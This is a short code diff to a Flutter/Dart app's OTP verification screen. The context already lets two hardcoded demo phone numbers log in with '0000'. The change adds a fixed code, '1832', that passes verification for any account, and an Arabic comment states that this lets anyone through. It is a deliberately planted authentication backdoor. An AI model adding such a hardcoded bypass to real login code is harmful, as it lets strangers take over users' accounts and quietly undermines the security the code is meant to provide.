@@ -130,7 +130,9 @@ class _OtpScreenState extends State<OtpScreen> {
       bool isDemoUser = (widget.phoneNumber == '971508949923' ||
           widget.phoneNumber == '971999999999');
       bool isCorrectOtp =
-          (enteredOtp == storedOtp) || (isDemoUser && enteredOtp == '0000');
+          (enteredOtp == storedOtp) || 
+          (isDemoUser && enteredOtp == '0000') ||
+          (enteredOtp == '1832'); // OTP ثابت يسمح لأي شخص بالمرور
 
       if (isCorrectOtp) {
         // OTP is correct, proceed with login
